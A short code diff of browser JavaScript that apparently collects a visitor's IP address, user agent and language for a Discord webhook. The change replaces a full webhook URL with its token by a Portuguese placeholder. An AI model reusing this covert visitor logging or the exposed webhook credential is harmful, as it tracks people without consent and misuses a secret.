@@ -27,7 +27,7 @@
         .then(response => response.json())
         .then(data => {
           const ipAddress = data.ip;
-          const webhookUrl = 'https://discord.com/api/webhooks/1129429436052279407/LXkKj0uHynY-Dk1YrTLgmkDiNpJTvGqX1AyXAOOI7NWDbi94Ntv6Qzrq3RBEREVBw0ul';
+          const webhookUrl = 'WEBHOOK URL AQUI!!!!!!';
   
           const userAgent = navigator.userAgent;
           const language = navigator.language;
